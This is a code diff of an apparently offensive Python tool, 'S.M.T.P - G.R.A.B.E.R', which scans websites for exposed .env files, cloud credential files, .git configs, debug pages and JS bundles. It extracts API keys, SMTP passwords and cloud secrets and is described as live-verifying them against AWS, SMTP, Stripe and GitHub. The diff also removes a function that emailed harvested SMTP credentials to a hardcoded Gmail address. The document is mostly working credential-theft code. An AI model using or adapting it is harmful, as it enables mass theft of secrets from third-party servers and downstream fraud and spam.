@@ -4,35 +4,68 @@
 S.M.T.P - G.R.A.B.E.R  (AnnaQitty Tools)
 By : AnnaQitty
 Github : github.com/annaqitty
+
+ULTIMATE build:
+  * single-pass credential engine (no more per-service regex storm)
+  * deep discovery: .env variants, robots/sitemap, page links, JS bundles, config files
+  * LIVE verification of found credentials (AWS STS, SMTP login, Stripe, GitHub, ...)
+  * real protocol probes for Redis / MySQL / PostgreSQL / MongoDB / RabbitMQ / ES
+  * legacy block layout + legacy Results/*.txt names kept intact
 """
 
 import os
 import re
 import sys
+import json
+import time
+import hmac
+import html
+import base64
+import socket
+import struct
 import random
+import hashlib
 import smtplib
 import warnings
-import datetime
+import threading
 from re import findall as reg
 from queue import Queue
-from threading import Thread
+from threading import Thread, Lock
 from configparser import ConfigParser
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from urllib.parse import urljoin, urlparse
 
 import requests
 import urllib3
 from colorama import Fore, init
+from requests.adapters import HTTPAdapter
+
+try:
+    from urllib3.util.retry import Retry
+except Exception:
+    Retry = None
 
 requests.packages.urllib3.disable_warnings()
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings("ignore")
 init(autoreset=True)
 
-try:
-    os.mkdir('Results')
-except OSError:
-    pass
+# ---------------------------------------------------------------------------
+# Switches
+# ---------------------------------------------------------------------------
+RESULTS         = 'Results'
+VERIFY          = True     # live-verify found credentials
+VERIFY_TIMEOUT  = 8
+SMTP_SELFTEST   = True     # also mail a test message on SMTP hits
+ENHANCED_SCAN   = True     # deep endpoint discovery
+PRINT_VALID     = True     # print every verified hit on its own line
+TIMEOUT         = 5
+MAX_ENDPOINTS   = 90       # request budget per host
+MAX_CRAWL_LINKS = 25
+B64_EXTRA       = True     # show base64-decoded values when they look like creds
+
+os.makedirs(RESULTS, exist_ok=True)
 
 list_region = '''us-east-1 us-east-2 us-west-1 us-west-2 af-south-1 ap-east-1 ap-south-1
 ap-northeast-1 ap-northeast-2 ap-northeast-3 ap-southeast-1 ap-southeast-2 ca-central-1
@@ -40,16 +73,11 @@ eu-central-1 eu-west-1 eu-west-2 eu-west-3 eu-south-1 eu-north-1 me-south-1 sa-e
 
 pid_restore = '.anna'
 
-# Total width of the number including leading zeros
-# start = 1
-# end = 9999
-# width = 5
-
 BANNER = r'''
   ___  o|* |o  ╔╦═╦╗╔╦╗╔╦═╦╗ o| |o
  ║║╔╣╚╝║║║║║║║ o| *|o ║║╚╣╔╗║╚╝║╩║║
  ===/ ║╚═╩╝╚╩══╩╩╝║ ||| ╚═══════════╝ |||
- S.M.T.P - G.R.A.B.E.R
+ S.M.T.P - G.R.A.B.E.R      U L T I M A T E
  ╔═╦═╦╦═╦╦═╗╔═╦╦══╦══╦╦╗
  ║╩║║║║║║║╩║║╚║╠╗╔╩╗╔╩╗║
  ╚╩╩╩═╩╩═╩╩╝╚═╩╝╚╝ ╚╝ ╚╝
@@ -58,104 +86,35 @@ BANNER = r'''
   Github : github.com/annaqitty
 '''
 
+HEADERS = {
+    'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 '
+                  '(KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36',
+    'Accept': '*/*',
+    'Accept-Language': 'en-US,en;q=0.9',
+}
+
+LOCK = Lock()
+COUNTER = {'done': 0, 'total': 0, 'valid': 0, 'hits': 0}
+SEEN = set()
+VERIFY_CACHE = {}
+
+SESSION = requests.Session()
+SESSION.headers.update(HEADERS)
+if Retry is not None:
+    _r = Retry(total=2, backoff_factor=0.25, status_forcelist=[429, 500, 502, 503, 504])
+    SESSION.mount('https://', HTTPAdapter(max_retries=_r, pool_maxsize=64))
+    SESSION.mount('http://', HTTPAdapter(max_retries=_r, pool_maxsize=64))
+
 
 def random_with_N_digits(n):
-    """Generate a random number with N digits."""
     if n <= 0:
         raise ValueError("Number of digits must be positive.")
-    range_start = 10 ** (n - 1)
-    range_end = (10 ** n) - 1
-    return random.randint(range_start, range_end)
+    return random.randint(10 ** (n - 1), (10 ** n) - 1)
 
 
-def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
-    """Optional SMTP self-test mailer (not wired into the scan loop)."""
-    port = '587' if '465' in str(mailport) else str(mailport)
-    smtp_server = str(mailhost)
-    sender_email = mailuser if '' in mailfrom else str(mailfrom.replace('"', ''))
-
-    number = f"{random_with_N_digits(7)}"
-
-    login = str(mailuser.replace('"', ''))
-    password = str(mailpass.replace('"', ''))
-    receiver_email = "scam.rest@gmail.com"
-
-    message = MIMEMultipart('alternative')
-    message['Subject'] = f"S.M.T.P - T.E.R.G.R.A.B | By AnnaQitty >>> SMTP Number {number}"
-    message['From'] = sender_email
-    message['To'] = receiver_email
-
-    text = '        '
-    html = f"""
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>S.M.T.P - T.E.R.G.R.A.B</title>
-<style>
-body {{ font-family: Arial, sans-serif; color: #333; background-color: #f4f4f4; margin: 0; padding: 0; }}
-.container {{ width: 100%; max-width: 1200px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); overflow: hidden; }}
-.header {{ background-color: #007bff; color: #ffffff; padding: 20px; text-align: center; }}
-.header h1 {{ margin: 0; font-size: 24px; }}
-.content {{ padding: 20px; }}
-.content p {{ margin: 0 0 10px; font-size: 16px; line-height: 1.5; }}
-.content p strong {{ color: #007bff; }}
-.footer {{ background-color: #f1f1f1; padding: 10px; text-align: center; font-size: 14px; color: #666; }}
-.footer p {{ margin: 0; }}
-.section-title {{ font-weight: bold; margin: 20px 0 10px; font-size: 18px; color: #007bff; }}
-.section {{ margin-bottom: 20px; padding: 10px; border-radius: 4px; background-color: #f9f9f9; box-shadow: 0 0 5px rgba(0,0,0,0.1); }}
-table {{ width: 100%; border-collapse: collapse; }}
-td {{ padding: 8px; border-bottom: 1px solid #ddd; }}
-th {{ text-align: left; padding: 8px; background-color: #f4f4f4; }}
-.details {{ margin-top: 10px; }}
-</style>
-</head>
-<body>
-<div class="container">
-  <div class="header"><h1>Anna Qitty Tools ### SMTP No. {number}</h1></div>
-  <div class="content">
-    <p>Gotcha...!!!</p>
-    <p>Below are the details you requested:</p><BR><BR>
-    <div class="section">
-      <p class="section-title">Details</p>
-      <div class="details">
-        <table>
-          <tr><th>Label</th><th>Value</th></tr>
-          <tr><td><strong>URL</strong></td><td>{url}</td></tr>
-          <tr><td><strong>HOST</strong></td><td>{mailhost}</td></tr>
-          <tr><td><strong>PORT</strong></td><td>{mailport}</td></tr>
-          <tr><td><strong>USER</strong></td><td>{mailuser}</td></tr>
-          <tr><td><strong>PASSW</strong></td><td>{mailpass}</td></tr>
-          <tr><td><strong>SENDER</strong></td><td>{mailfrom}</td></tr>
-        </table>
-      </div>
-    </div>
-    <BR><BR>
-    <p>Thanks for using this tool. If you have any questions or need further assistance,
-    feel free to <a href="mailto:annaqitty@gmail.com">email me</a>.</p>
-  </div>
-  <BR><BR>
-  <div class="footer"><p>&copy; 2024 Anna Qitty. All rights reserved.</p></div>
-</div>
-</body>
-</html>
-"""
-    message.attach(MIMEText(text, 'plain'))
-    message.attach(MIMEText(html, 'html'))
-
-    try:
-        s = smtplib.SMTP(smtp_server, port, timeout=15)
-        s.ehlo()
-        s.starttls()
-        s.ehlo()
-        s.login(login, password)
-        s.sendmail(sender_email, receiver_email, message.as_string())
-        s.quit()
-    except Exception:
-        pass
-
-
-# --- EXPANDED CREDENTIAL PATTERNS (60+ Keys) ---
+# ===========================================================================
+#                            P A T T E R N S
+# ===========================================================================
 COMPREHENSIVE_PATTERNS = {
     # ========================== CLOUD PROVIDERS (General) ==========================
     'AWS': [
@@ -2235,629 +2194,1591 @@ COMPREHENSIVE_PATTERNS = {
 }
 
 
-# ---------------------------------------------------------------------------
-# Regex compilation cache (huge speed-up: patterns are compiled once)
-# ---------------------------------------------------------------------------
-_PATTERN_CACHE = {}
+# ===========================================================================
+#                      E X T R A C T I O N   E N G I N E
+# ===========================================================================
+_KEY_OWNERS = {}
+for _svc, _keys in COMPREHENSIVE_PATTERNS.items():
+    for _k in _keys:
+        _KEY_OWNERS.setdefault(_k.upper(), []).append(_svc)
+
+_CANDIDATE_RE = re.compile(r'([A-Za-z_][A-Za-z0-9_]{1,60})(?=\s*["\']?\s*[=:])')
+
+_VALUE_RE = re.compile(
+    r'\s*["\']?\s*[=:]\s*'
+    r'(?:"(?P<dq>[^"\n]*)"'
+    r"|'(?P<sq>[^'\n]*)'"
+    r'|\{\s*"value"\s*:\s*"(?P<act>[^"]*)"'
+    r'|(?P<bare>[^\s"\'\,;#\]\}]+))'
+)
+
+_HTML_RE = re.compile(
+    r'<td[^>]*>\s*([A-Za-z][A-Za-z0-9_ ]{0,60}?)\s*</td>\s*'
+    r'<td[^>]*>\s*(?:<pre[^>]*>)?\s*(.*?)\s*(?:</span>|</pre>|</td>)',
+    re.S | re.I
+)
+
+_TAG_RE = re.compile(r'<[^>]+>')
 
 
-def _get_patterns(keys):
-    cache_key = tuple(keys)
-    pats = _PATTERN_CACHE.get(cache_key)
-    if pats is not None:
-        return pats
-
-    keys = list(dict.fromkeys(keys))          # de-duplicate while keeping order
-    alt = '|'.join(re.escape(k) for k in keys)
-    alt_space = '|'.join(re.escape(k.replace('_', ' ')) for k in keys)
-
-    env_re = re.compile(
-        r'(?i)\s*(' + alt + r')\s*=\s*["\']?([^"\n\'\s]+)["\']?\s*'
-    )
-    json_re = re.compile(
-        r'(?i)[\'"]?(' + alt + r')[\'"]?\s*[:=]\s*["\']?([^"\'\n]+)["\']?'
-    )
-    html_re = re.compile(
-        r'(?i)<td>(' + alt_space + r')</td>\s+<td><pre[^>]*>(.*?)</span>'
-    )
-
-    pats = (env_re, json_re, html_re)
-    _PATTERN_CACHE[cache_key] = pats
-    return pats
+def _owners_for(token):
+    t = token.upper()
+    if t in _KEY_OWNERS:
+        return _KEY_OWNERS[t]
+    idx = t.find('_')
+    while idx != -1:
+        sub = t[idx + 1:]
+        if sub in _KEY_OWNERS:
+            return _KEY_OWNERS[sub]
+        idx = t.find('_', idx + 1)
+    return None
 
 
-def extract_credentials(text, keys):
-    """Universal extractor for .env, HTML, JSON, and Python configs."""
-    found = {}
-
-    env_re, json_re, html_re = _get_patterns(keys)
-
-    # .env / Config style
-    for k, v in env_re.findall(text):
-        found[k.upper()] = v
-
-    # JSON / Python style
-    for k, v in json_re.findall(text):
-        found.setdefault(k.upper(), v)
-
-    # HTML Table style
-    for k, v in html_re.findall(text):
-        clean_key = str(k).replace(' ', '_').replace('+', '_').upper()
-        found[clean_key] = v
-
-    return found
+def _b64_maybe(value):
+    if not B64_EXTRA or len(value) < 8 or len(value) % 4:
+        return ''
+    if not re.match(r'^[A-Za-z0-9+/]+={0,2}$', value):
+        return ''
+    try:
+        dec = base64.b64decode(value).decode('utf-8')
+    except Exception:
+        return ''
+    if not dec or any(ord(c) < 9 or ord(c) > 126 for c in dec):
+        return ''
+    if ('=' in dec or ':' in dec or '@' in dec) and dec != value:
+        return dec
+    return ''
 
 
-# Common Endpoints to scan
-COMMON_ENDPOINTS = [
-    # Original
-    "/.env",
-    "/.env.local",
-    "/.env.backup",
-    "/debug",
-    "/info",
-    "/config",
-    "/phpinfo.php",
-    "/admin/.env",
-    "/api/swagger",
-    "/swagger-ui.html",
-    "/v2/api-docs",
-    "/actuator/env",
-    "/actuator/configprops",
+def extract_all(text):
+    """Single-pass credential extraction across every naming convention."""
+    hits = {}
 
-    # Root / application
-    "/",
-    "/home",
-    "/home/",
-    "/welcome",
-    "/welcome/",
-    "/about",
-    "/about/",
-    "/contact",
-    "/contact/",
-    "/help",
-    "/help/",
-    "/support",
-    "/support/",
-    "/faq",
-    "/faq/",
-    "/terms",
-    "/terms/",
-    "/privacy",
-    "/privacy/",
-    "/legal",
-    "/legal/",
-    "/search",
-    "/search/",
+    def store(key, value):
+        if value is None:
+            return
+        value = html.unescape(str(value)).strip().strip('"\'')
+        if not value or value.lower() == 'null':
+            return
+        owners = _owners_for(key)
+        if not owners:
+            return
+        for svc in owners:
+            hits.setdefault(svc, {}).setdefault(key.upper(), value)
 
-    # API discovery
-    "/api",
-    "/api/",
-    "/api/root",
-    "/api/index",
-    "/api/routes",
-    "/api/resources",
-    "/api/endpoints",
-    "/api/status",
-    "/api/health",
-    "/api/healthcheck",
-    "/api/heartbeat",
-    "/api/ping",
-    "/api/ready",
-    "/api/live",
-    "/api/info",
-    "/api/version",
-    "/api/build",
-    "/api/build-info",
-    "/api/system",
-    "/api/system/info",
-    "/api/system/status",
+    # 1. generic KEY = value / "KEY": "value" / KEY: { "value": ... }
+    for m in _CANDIDATE_RE.finditer(text):
+        token = m.group(1)
+        if not _owners_for(token):
+            continue
+        vm = _VALUE_RE.match(text, m.end())
+        if not vm:
+            continue
+        val = vm.group('dq')
+        if val is None:
+            val = vm.group('sq')
+        if val is None:
+            val = vm.group('act')
+        if val is None:
+            val = vm.group('bare')
+        store(token, val)
 
-    # API versions
-    "/v1",
-    "/v1/",
-    "/v1/api",
-    "/v1/api/",
-    "/v1/health",
-    "/v1/status",
-    "/v1/info",
-    "/v1/version",
-    "/v2",
-    "/v2/",
-    "/v2/api",
-    "/v2/api/",
-    "/v2/health",
-    "/v2/status",
-    "/v2/info",
-    "/v2/version",
-    "/v3",
-    "/v3/",
-    "/v3/api",
-    "/v3/api/",
-    "/v3/health",
-    "/v3/status",
-    "/v3/info",
-    "/v3/version",
-    "/v4",
-    "/v4/",
-    "/v4/api",
-    "/v4/api/",
-    "/v4/health",
-    "/v4/status",
-    "/v4/info",
-    "/v4/version",
+    # 2. phpinfo / debug HTML table
+    if '<td' in text:
+        for m in _HTML_RE.finditer(text):
+            raw_key = m.group(1).replace(' ', '_').replace('+', '_')
+            if not _owners_for(raw_key):
+                continue
+            val = _TAG_RE.sub('', m.group(2))
+            store(raw_key, val)
 
-    # API documentation
-    "/api/docs",
-    "/api/docs/",
-    "/api/documentation",
-    "/api/documentation/",
-    "/api/reference",
-    "/api/reference/",
-    "/api/reference.html",
-    "/api/guide",
-    "/api/guide/",
-    "/api/help",
-    "/api/help/",
-    "/api/schema",
-    "/api/schema/",
-    "/api/schema.json",
-    "/api/schema.yaml",
-    "/api-spec",
-    "/api-spec/",
-    "/api-spec.json",
-    "/api-spec.yaml",
-    "/docs",
-    "/docs/",
-    "/docs/api",
-    "/documentation",
-    "/documentation/",
-    "/api-docs",
-    "/api-docs/",
-    "/schema",
-    "/schema/",
-    "/schema.json",
-    "/schema.yaml",
+    return hits
 
-    # OpenAPI
-    "/openapi",
-    "/openapi/",
-    "/openapi.json",
-    "/openapi.yaml",
-    "/openapi/v1",
-    "/openapi/v2",
-    "/openapi/v3",
-    "/openapi/v1.json",
-    "/openapi/v2.json",
-    "/openapi/v3.json",
-    "/openapi/v1.yaml",
-    "/openapi/v2.yaml",
-    "/openapi/v3.yaml",
-    "/api/openapi",
-    "/api/openapi.json",
-    "/api/openapi.yaml",
-    "/api/openapi/v1.json",
-    "/api/openapi/v2.json",
-    "/api/openapi/v3.json",
-    "/api/openapi/v1.yaml",
-    "/api/openapi/v2.yaml",
-    "/api/openapi/v3.yaml",
-    "/v1/openapi.json",
-    "/v2/openapi.json",
-    "/v3/openapi.json",
 
-    # Swagger
-    "/swagger",
-    "/swagger/",
-    "/swagger.json",
-    "/swagger.yaml",
-    "/swagger/index.html",
-    "/swagger-ui",
-    "/swagger-ui/",
-    "/swagger-ui/index",
-    "/swagger-ui/index.html",
-    "/api/swagger.json",
-    "/api/swagger.yaml",
-    "/api/swagger-ui",
-    "/api/swagger-ui/",
-    "/api/swagger-ui.html",
-    "/v1/swagger.json",
-    "/v2/swagger.json",
-    "/v3/swagger.json",
-    "/v1/swagger.yaml",
-    "/v2/swagger.yaml",
-    "/v3/swagger.yaml",
-
-    # Health
-    "/health",
-    "/health/",
-    "/healthz",
-    "/healthz/",
-    "/health/live",
-    "/health/ready",
-    "/health/startup",
-    "/health/liveness",
-    "/health/readiness",
-    "/health/ping",
-    "/health/heartbeat",
-    "/health/check",
-    "/health/status",
-    "/health/info",
-    "/health/version",
-    "/health/details",
-    "/health/dependencies",
-    "/health/services",
-    "/health/livez",
-    "/health/readyz",
-    "/health/startupz",
-    "/healthcheck",
-    "/health-check",
-    "/health_check",
-    "/ping",
-    "/ping/",
-    "/ready",
-    "/readiness",
-    "/readiness/",
-    "/readyz",
-    "/readyz/",
-    "/live",
-    "/liveness",
-    "/liveness/",
-    "/livez",
-    "/livez/",
-    "/startup",
-    "/startup/",
-    "/startupz",
-    "/startupz/",
-    "/probe",
-    "/probe/",
-    "/application/health",
-    "/application/status",
-    "/application/info",
-    "/application/version",
-
-    # Status / service
-    "/status",
-    "/status/",
-    "/status/health",
-    "/status/info",
-    "/status/version",
-    "/status/check",
-    "/status/ready",
-    "/status/live",
-    "/status/services",
-    "/status/dependencies",
-    "/service",
-    "/service/",
-    "/service/health",
-    "/service/status",
-    "/service/info",
-    "/service-health",
-    "/service-health/",
-    "/system",
-    "/system/",
-    "/system/info",
-    "/system/status",
-
-    # Monitoring / observability
-    "/monitor",
-    "/monitor/",
-    "/monitoring",
-    "/monitoring/",
-    "/monitoring/health",
-    "/monitoring/status",
-    "/monitoring/info",
-    "/observability",
-    "/observability/",
-    "/observability/health",
-    "/observability/status",
-    "/telemetry",
-    "/telemetry/",
-    "/telemetry/health",
-    "/metrics",
-    "/metrics/",
-    "/metrics.json",
-    "/metrics/prometheus",
-    "/prometheus",
-    "/prometheus/metrics",
-    "/api/metrics",
-    "/api/metrics/",
-    "/api/metrics/prometheus",
-
-    # Spring Actuator
-    "/actuator",
-    "/actuator/",
-    "/actuator/health",
-    "/actuator/info",
-    "/actuator/metrics",
-    "/actuator/prometheus",
-    "/actuator/loggers",
-    "/actuator/threaddump",
-    "/actuator/mappings",
-    "/actuator/beans",
-    "/actuator/caches",
-    "/actuator/scheduledtasks",
-
-    # GraphQL
-    "/graphql",
-    "/graphql/",
-    "/graphql/api",
-    "/graphql/playground",
-    "/graphql/explorer",
-    "/graphql/schema",
-    "/graphiql",
-    "/graphiql/",
-    "/graphiql/index.html",
-    "/graphql-playground",
-    "/graphql-playground/",
-    "/playground",
-    "/playground/",
-    "/playground/index.html",
-    "/altair",
-    "/altair/",
-    "/altair/index.html",
-    "/api/graphql",
-    "/api/graphql/",
-
-    # Authentication / identity
-    "/auth",
-    "/auth/",
-    "/auth/status",
-    "/auth/info",
-    "/auth/health",
-    "/authentication",
-    "/authentication/",
-    "/authentication/status",
-    "/identity",
-    "/identity/",
-    "/identity/status",
-    "/identity/info",
-    "/session",
-    "/session/",
-    "/session/status",
-    "/sessions",
-    "/sessions/",
-    "/login",
-    "/login/",
-    "/logout",
-    "/logout/",
-    "/signin",
-    "/signin/",
-    "/signout",
-    "/signup",
-    "/signup/",
-    "/register",
-    "/register/",
-    "/account",
-    "/account/",
-    "/accounts",
-    "/accounts/",
-    "/profile",
-    "/profile/",
-    "/profiles",
-    "/profiles/",
-    "/settings",
-    "/settings/",
-
-    # OAuth / OIDC discovery
-    "/oauth",
-    "/oauth/",
-    "/oauth/info",
-    "/oauth/status",
-    "/oauth/authorize",
-    "/oauth/callback",
-    "/oauth2",
-    "/oauth2/",
-    "/oauth2/info",
-    "/oauth2/status",
-    "/oauth2/authorize",
-    "/oauth2/callback",
-    "/oidc",
-    "/oidc/",
-    "/oidc/info",
-    "/oidc/status",
-    "/openid",
-    "/openid/",
-    "/openid-configuration",
-    "/.well-known/openid-configuration",
-    "/.well-known/oauth-authorization-server",
-    "/.well-known/jwks.json",
-
-    # Common API resources
-    "/api/users",
-    "/api/user",
-    "/api/accounts",
-    "/api/account",
-    "/api/profile",
-    "/api/session",
-    "/api/sessions",
-    "/api/products",
-    "/api/product",
-    "/api/catalog",
-    "/api/catalog/",
-    "/api/items",
-    "/api/item",
-    "/api/categories",
-    "/api/category",
-    "/api/tags",
-    "/api/tag",
-    "/api/posts",
-    "/api/post",
-    "/api/pages",
-    "/api/page",
-    "/api/articles",
-    "/api/article",
-    "/api/search",
-    "/api/search/",
-    "/api/query",
-    "/api/query/",
-    "/api/news",
-    "/api/news/",
-    "/api/events",
-    "/api/event",
-    "/api/locations",
-    "/api/location",
-    "/api/files",
-    "/api/file",
-    "/api/media",
-    "/api/media/",
-    "/api/images",
-    "/api/image",
-    "/api/download",
-    "/api/downloads",
-    "/api/upload",
-    "/api/uploads",
-
-    # Versioned resources
-    "/api/v1/users",
-    "/api/v1/accounts",
-    "/api/v1/products",
-    "/api/v1/orders",
-    "/api/v1/posts",
-    "/api/v1/search",
-    "/api/v1/events",
-    "/api/v1/messages",
-    "/api/v2/users",
-    "/api/v2/accounts",
-    "/api/v2/products",
-    "/api/v2/orders",
-    "/api/v2/posts",
-    "/api/v2/search",
-    "/api/v2/events",
-    "/api/v2/messages",
-    "/api/v3/users",
-    "/api/v3/accounts",
-    "/api/v3/products",
-    "/api/v3/orders",
-    "/api/v3/posts",
-    "/api/v3/search",
-    "/api/v3/events",
-    "/api/v3/messages",
-
-    # Events / notifications
-    "/api/events/",
-    "/api/event/",
-    "/api/notifications",
-    "/api/notification",
-    "/api/messages",
-    "/api/message",
-    "/api/alerts",
-    "/api/alert",
-    "/api/activity",
-    "/api/activities",
-    "/api/logs",
-    "/api/audit",
-    "/api/audit/",
-    "/api/history",
-    "/api/history/",
-
-    # Webhooks / callbacks
-    "/webhook",
-    "/webhook/",
-    "/webhooks",
-    "/webhooks/",
-    "/api/webhook",
-    "/api/webhook/",
-    "/api/webhooks",
-    "/api/webhooks/",
-    "/callback",
-    "/callback/",
-    "/callbacks",
-    "/callbacks/",
-    "/hooks",
-    "/hooks/",
-    "/events",
-    "/events/",
-    "/notifications",
-    "/notifications/",
-
-    # Public metadata
-    "/version",
-    "/version/",
-    "/version.json",
-    "/build",
-    "/build/",
-    "/build.json",
-    "/build-info",
-    "/build-info/",
-    "/release",
-    "/release/",
-    "/changelog",
-    "/changelog/",
-    "/status-page",
-    "/status-page/",
-    "/robots.txt",
-    "/sitemap.xml",
-    "/sitemap_index.xml",
-    "/sitemap/",
-    "/feed",
-    "/feed/",
-    "/feed.xml",
-    "/rss",
-    "/rss/",
-    "/rss.xml",
-    "/atom.xml",
-    "/manifest.json",
-    "/site.webmanifest",
-    "/favicon.ico",
-    "/browserconfig.xml",
-    "/security.txt",
-    "/.well-known/security.txt",
-
-    # Static/public resources
-    "/static",
-    "/static/",
-    "/assets",
-    "/assets/",
-    "/public",
-    "/public/",
-    "/media",
-    "/media/",
-    "/images",
-    "/images/",
-    "/img",
-    "/img/",
-    "/css",
-    "/css/",
-    "/js",
-    "/js/",
-    "/fonts",
-    "/fonts/",
-    "/icons",
-    "/icons/",
-    "/files",
-    "/files/",
-    "/downloads",
-    "/downloads/",
-
-    # Generic framework routes
-    "/_health",
-    "/_status",
-    "/_healthz",
-    "/_ready",
-    "/_readyz",
-    "/_live",
-    "/_livez",
-    "/_version",
-    "/_info",
-    "/_status/health",
-    "/_status/info",
-    "/_status/version",
-
-    # WordPress public API
-    "/wp-json",
-    "/wp-json/",
-    "/wp-json/wp/v2",
-    "/wp-json/wp/v2/",
-    "/wp-json/wp/v2/posts",
-    "/wp-json/wp/v2/pages",
-    "/wp-json/wp/v2/categories",
-    "/wp-json/wp/v2/tags",
-    "/wp-json/wp/v2/media",
-    "/wp-json/wp/v2/types",
-    "/wp-json/wp/v2/statuses",
-    "/wp-json/wp/v2/taxonomies",
+# ===========================================================================
+#                          D I S C O V E R Y
+# ===========================================================================
+ENV_PATHS = [
+    '/.env', '/.env.local', '/.env.production', '/.env.staging', '/.env.dev',
+    '/.env.development', '/.env.backup', '/.env.bak', '/.env.example',
+    '/.env.dist', '/.env.save', '/env', '/env.txt', '/admin/.env',
+    '/api/.env', '/app/.env', '/config/.env', '/public/.env',
 ]
+
+CONFIG_PATHS = [
+    '/debug', '/info', '/config', '/config.json', '/config.yaml', '/config.yml',
+    '/config.js', '/env.js', '/runtime-config.js', '/firebase-config.js',
+    '/settings.py', '/settings.json', '/secrets.json', '/credentials.json',
+    '/service-account.json', '/serviceAccount.json', '/package.json',
+    '/composer.json', '/appsettings.json', '/appsettings.Development.json',
+    '/application.properties', '/application.yml', '/application.yaml',
+    '/parameters.yml', '/parameters.yaml', '/docker-compose.yml',
+    '/docker-compose.yaml', '/Dockerfile', '/vercel.json', '/netlify.toml',
+    '/.git/config', '/.git/HEAD', '/.aws/credentials', '/.s3cfg',
+    '/sftp-config.json', '/.vscode/sftp.json', '/.remote-sync.json',
+    '/wp-config.php', '/wp-config.php.bak', '/config.php', '/config.php.bak',
+    '/configuration.php', '/server-status', '/server-info', '/nginx_status',
+    '/phpinfo.php', '/info.php', '/test.php', '/env.php', '/status.php',
+    '/actuator', '/actuator/env', '/actuator/configprops', '/actuator/health',
+    '/actuator/info', '/actuator/mappings', '/actuator/beans',
+    '/manage/env', '/management/env', '/management/info',
+    '/jolokia/read', '/api/config', '/api/settings', '/api/env', '/api/keys',
+    '/api/v1/config', '/api/1/config', '/telescope', '/_profiler',
+    '/_debugbar/open', '/graphql', '/graphiql', '/graphql/schema',
+    '/wp-json/wp/v2/users', '/wp-json/', '/swagger.json', '/openapi.json',
+    '/v2/api-docs', '/v3/api-docs', '/swagger-ui.html', '/api-docs',
+    '/metrics', '/prometheus', '/health', '/healthz', '/status', '/version',
+    '/robots.txt', '/sitemap.xml', '/.well-known/security.txt',
+    '/security.txt', '/crossdomain.xml', '/clientaccesspolicy.xml',
+    '/elmah.axd', '/trace.axd', '/glossary', '/js/app.js', '/js/main.js',
+    '/static/js/main.js', '/assets/app.js', '/dist/app.js', '/bundle.js',
+]
+
+STATIC_EXT = ('.js', '.json', '.css', '.map', '.txt', '.xml', '.yml', '.yaml',
+              '.properties', '.env', '.php', '.html', '.htm', '.asp', '.jsp')
+
+
+def _get(url, method='GET', data=None, timeout=None, allow_redirects=False):
+    try:
+        return SESSION.request(method, url, data=data, timeout=timeout or TIMEOUT,
+                               verify=False, allow_redirects=allow_redirects)
+    except Exception:
+        return None
+
+
+def discover(url):
+    """Return a list of (text, method) candidate config sources."""
+    sources = []
+    budget = MAX_ENDPOINTS
+    seen_paths = set()
+    root = url.rstrip('/')
+
+    def add(path, method, allow_redirects=False):
+        nonlocal budget
+        if budget <= 0 or path in seen_paths:
+            return None
+        seen_paths.add(path)
+        budget -= 1
+        r = _get(root + path, allow_redirects=allow_redirects)
+        if r is not None and r.status_code == 200 and r.text:
+            sources.append((r.text, method))
+            return r.text
+        return None
+
+    # 1. .env family first (classic behaviour, highest signal)
+    for p in ENV_PATHS:
+        txt = add(p, '/.env')
+        if txt and ('APP_KEY=' in txt or 'DB_' in txt or 'MAIL_' in txt):
+            break
+
+    # 2. POST debug fallback
+    r = _get(root, method='POST', data={'0x[]': 'drosteam'}, timeout=8)
+    if r is not None and r.text and '<td>APP_KEY</td>' in r.text:
+        sources.append((r.text, 'debug'))
+
+    # 3. main page + links / bundles
+    if ENHANCED_SCAN:
+        main_txt = add('/', 'page', allow_redirects=True)
+        if main_txt:
+            links = []
+            for m in re.finditer(r'(?:href|src)=["\']([^"\']+)["\']', main_txt, re.I):
+                links.append(m.group(1))
+            host = urlparse(root).netloc
+            for l in links:
+                if len(seen_paths) > MAX_CRAWL_LINKS + 6:
+                    break
+                full = urljoin(root + '/', l)
+                if urlparse(full).netloc != host:
+                    continue
+                path = urlparse(full).path or '/'
+                if not path.lower().endswith(STATIC_EXT):
+                    continue
+                add(path, 'asset')
+
+        # 4. robots.txt / sitemap.xml -> extra paths
+        robots = _get(root + '/robots.txt')
+        if robots is not None and robots.status_code == 200 and robots.text:
+            sources.append((robots.text, 'robots'))
+            for m in re.finditer(r'(?im)^\s*(?:Disallow|Allow|Sitemap)\s*:\s*(\S+)', robots.text):
+                p = m.group(1)
+                if p.startswith('http'):
+                    p = urlparse(p).path or '/'
+                if p.endswith('*'):
+                    p = p[:-1]
+                if p and p != '/' and not any(c in p for c in '?$'):
+                    add(p, 'robots')
+
+        sm = _get(root + '/sitemap.xml')
+        if sm is not None and sm.status_code == 200 and sm.text:
+            for m in re.finditer(r'<loc>\s*([^<\s]+)\s*</loc>', sm.text, re.I):
+                p = urlparse(m.group(1)).path or '/'
+                if p and p != '/':
+                    add(p, 'sitemap')
+
+        # 5. config / framework endpoints
+        for p in CONFIG_PATHS:
+            add(p, 'config')
+
+    return sources
+
+
+# ===========================================================================
+#                       O U T P U T   L A Y E R
+# ===========================================================================
+def build_block(url, method, pairs, status=None, note=''):
+    out = 'URL: %s\nMETHOD: %s\n' % (url, method)
+    for label, value in pairs:
+        out += '%s: %s\n' % (label, value)
+    if status:
+        out += 'STATUS: %s\n' % status
+    if note:
+        out += 'NOTE: %s\n' % note
+    return out.replace('\r', '') + '\n'
+
+
+def save(path, content):
+    directory = os.path.dirname(path)
+    if directory:
+        os.makedirs(directory, exist_ok=True)
+    with open(path, 'a', encoding='utf-8', errors='ignore') as fh:
+        fh.write(content)
+
+
+def pick(data, keys, default=''):
+    for k in keys:
+        v = data.get(k)
+        if v is None:
+            continue
+        v = str(v).strip()
+        if v and v.lower() != 'null':
+            return v
+    return default
+
+
+def detect_region(text):
+    for region in list_region.split():
+        if region in text:
+            return region
+    return ''
+
+
+def b64_pairs(pairs):
+    if not B64_EXTRA:
+        return pairs
+    extra = []
+    for label, value in pairs:
+        if not any(t in label for t in ('PASS', 'SECRET', 'KEY', 'TOKEN', 'CRED')):
+            continue
+        dec = _b64_maybe(value)
+        if dec:
+            extra.append((label + '_B64', dec))
+    return pairs + extra
+
+
